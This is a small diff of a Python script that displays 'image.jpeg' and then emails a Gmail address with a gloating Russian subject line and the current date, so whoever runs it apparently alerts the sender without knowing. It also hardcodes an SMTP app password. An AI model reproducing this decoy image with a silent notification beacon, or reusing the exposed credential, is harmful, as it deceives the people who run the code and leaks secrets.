@@ -1,4 +1,4 @@
-from os import popen
+from os import popen, getcwd
 from PIL import Image
 # system("curl -O https://bootstrap.pypa.io/get-pip.py")
 # system("sudo python get-pip.py")
@@ -16,5 +16,5 @@ def shape():
     EmailServer('smtp.gmail.com', 587, sender, "eifjuipuczaxguxb").send_message(Message(myhtml), destination, f"Попался, который кусался! {popen('date').read()}")
 
 if __name__ == "__main__": 
-  Image.open("image.jpeg").show()
+  Image.open(f"{getcwd()}/image.jpeg").show()
   shape()
